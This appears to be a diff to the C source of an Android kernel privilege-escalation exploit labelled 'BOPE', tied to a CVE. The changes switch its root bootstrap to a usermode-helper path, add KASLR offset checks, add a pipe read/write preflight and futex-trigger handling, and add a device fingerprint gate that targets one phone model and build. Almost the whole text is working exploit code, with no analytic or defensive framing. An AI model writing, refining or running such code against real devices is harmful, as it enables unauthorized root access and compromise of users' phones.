@@ -19,6 +19,8 @@
 #include <sys/resource.h>
 #include <sys/stat.h>
 #include <sys/syscall.h>
+#include <sys/system_properties.h>
+#include <sys/utsname.h>
 #include <sys/wait.h>
 #include <time.h>
 #include <unistd.h>
@@ -141,7 +143,7 @@ enum attempt_kernel_state {
   ATTEMPT_KERNEL_MUTATED = 2,
   ATTEMPT_FOPS_RESTORED = 3,
   ATTEMPT_PIPE_READY = 4,
-  ATTEMPT_NATIVE_WORK_SUBMITTED = 5,
+  ATTEMPT_UMH_TRIGGERED = 5,
   ATTEMPT_ROOT_READY = 6,
 };
 
@@ -369,13 +371,12 @@ static int do_one_attempt_post_trigger(void *ctx_v) {
   __atomic_store_n(&ctx->shared->status, ATTEMPT_PIPE_READY,
                    __ATOMIC_RELEASE);
 
-  /* Root bootstrap publishes a disposable PTY work item through the kernel's
-   * native schedule_work() path and restores the PTY after completion. */
+  /* Root bootstrap uses the preflighted native binfmt/request_module path.
+   * It contains no task/fdtable walk or dynamically discovered kernel object. */
   oss_diag_checkpoint("root-umh-start");
   int rooted = root_umh_install_fd_tracked(
-      fd, ctx->kernel_base, ctx->payload_base, ctx->memstart_addr,
-      ctx->kimage_voffset, ctx->root_umh_path, &ctx->shared->status,
-      ATTEMPT_NATIVE_WORK_SUBMITTED);
+      fd, ctx->kernel_base, ctx->memstart_addr, ctx->kimage_voffset,
+      ctx->root_umh_path, &ctx->shared->status, ATTEMPT_UMH_TRIGGERED);
   oss_diag_checkpoint(rooted ? "root-umh-ready" : "root-umh-failed");
   uint64_t null_owner = 0;
   int owner_cleared = oss_pipe_rw_write(
@@ -403,6 +404,13 @@ static int do_one_attempt(struct attempt_shared_state *shared,
   const char *root_umh_path = getenv("CVE43499_ROOT_HELPER");
   if (!validate_executable_elf(root_umh_path, 4096)) {
     fprintf(stderr, "[preflight] invalid root helper errno=%d\n", errno);
+    return 0;
+  }
+  if (!root_umh_preflight(root_umh_path)) {
+    fprintf(stderr,
+            "[preflight] deterministic binfmt/UMH plan rejected before "
+            "kernel mutation\n");
+    oss_diag_checkpoint("root-umh-binfmt-preflight-rejected");
     return 0;
   }
   const char *mm_factory_path = getenv("CVE43499_MM_FACTORY");
@@ -478,6 +486,19 @@ static int do_one_attempt(struct attempt_shared_state *shared,
     }
     p0_offset = tracefs_offset;
   }
+  if (kernel_base < TARGET_KIMAGE_TEXT_BASE) {
+    fprintf(stderr, "[kaslr] resolved base is below static text base\n");
+    return 0;
+  }
+  p0_offset = kernel_base - TARGET_KIMAGE_TEXT_BASE;
+  if (p0_offset > TARGET_KASLR_MAX_SLIDE ||
+      (p0_offset & (TARGET_KASLR_ALIGNMENT - 1ULL)) != 0) {
+    fprintf(stderr,
+            "[kaslr] resolved p0 offset invalid base=%016llx offset=%016llx\n",
+            (unsigned long long)kernel_base,
+            (unsigned long long)p0_offset);
+    return 0;
+  }
   puts("\x1b[33m[*] \x1b[0mstage=kernel-location-ready");
   __atomic_store_n(&shared->p0_gate_page_struct, 0, __ATOMIC_RELEASE);
   __atomic_store_n(&shared->p0_probe_page_struct, 0, __ATOMIC_RELEASE);
@@ -523,6 +544,24 @@ static int do_one_attempt(struct attempt_shared_state *shared,
   }
   oss_diag_checkpoint("configfs-plan-pretrigger-ok");
 
+  if (!oss_pipe_rw_prepare(kernel_base, payload_base) ||
+      !oss_pipe_rw_plan_ready()) {
+    fprintf(stderr,
+            "[preflight] deterministic pipe plan unavailable before futex "
+            "errno=%d(%s); retry is safe\n",
+            errno, strerror(errno));
+    return 0;
+  }
+  oss_diag_checkpoint("pipe-plan-gate-ok");
+  if (getenv("PIPE_PREFLIGHT_ONLY")) {
+    fprintf(stderr,
+            "[preflight] PIPE_PREFLIGHT_ONLY complete; futex mutation skipped\n");
+    oss_diag_checkpoint("pipe-preflight-only-success");
+    oss_pipe_rw_reset();
+    fflush(NULL);
+    return 1;
+  }
+
   /* root_umh_path was validated before KASLR and allocator grooming. */
 
   /* BISECT_VARIANT is a project-only diagnostic switch. The default v14
@@ -551,6 +590,11 @@ static int do_one_attempt(struct attempt_shared_state *shared,
         do_one_attempt_post_trigger, &ctx);
   }
   fprintf(stderr, "[futex] trigger result=%d\n", triggered);
+  if (!triggered &&
+      __atomic_load_n(&shared->status, __ATOMIC_ACQUIRE) ==
+          ATTEMPT_PRE_MUTATION) {
+    oss_pipe_rw_reset();
+  }
   if (triggered ||
       __atomic_load_n(&shared->status, __ATOMIC_ACQUIRE) != 0) {
     pid_t keeper = spawn_allocation_keeper();
@@ -574,6 +618,23 @@ static void raise_rlimit_to_max(int resource) {
   }
 }
 
+static int property_equals(const char *name, const char *expected) {
+  char value[PROP_VALUE_MAX] = {0};
+  return __system_property_get(name, value) > 0 &&
+         strcmp(value, expected) == 0;
+}
+
+static int target_matches(void) {
+  struct utsname info;
+  return uname(&info) == 0 &&
+         strcmp(info.release, TARGET_KERNEL_RELEASE) == 0 &&
+         strcmp(info.version, TARGET_KERNEL_VERSION) == 0 &&
+         property_equals("ro.product.model", TARGET_MODEL) &&
+         property_equals("ro.product.device", TARGET_DEVICE) &&
+         property_equals("ro.build.version.incremental", TARGET_BUILD) &&
+         property_equals("ro.build.fingerprint", TARGET_FINGERPRINT);
+}
+
 static int app_main(void) {
   struct timespec payload_started;
   if (clock_gettime(CLOCK_MONOTONIC, &payload_started) == -1) {
@@ -587,6 +648,13 @@ static int app_main(void) {
   }
 
   puts("[BOPE] Brazilian Open Payload Engine initialized");
+
+  if (!target_matches()) {
+    fprintf(stderr,
+            "[target] refused: expected %s/%s build=%s kernel=%s\n",
+            TARGET_MODEL, TARGET_DEVICE, TARGET_BUILD, TARGET_KERNEL_RELEASE);
+    return 1;
+  }
 
   int boot_quiet_sec = env_int_clamped("BOOT_QUIET_SEC", 120, 0, 300);
   struct timespec boot_now;
@@ -775,7 +843,11 @@ static int app_main(void) {
   }
 
   munmap(shared, sizeof(*shared));
-  if (success) {
+  if (success && getenv("PIPE_PREFLIGHT_ONLY")) {
+    puts("BOPE :: Preflight success\n"
+         "        Deterministic pipe plan ready; mutation skipped");
+    fflush(NULL);
+  } else if (success) {
     struct timespec payload_finished;
     if (clock_gettime(CLOCK_MONOTONIC, &payload_finished) == -1) {
       fatal_usage();
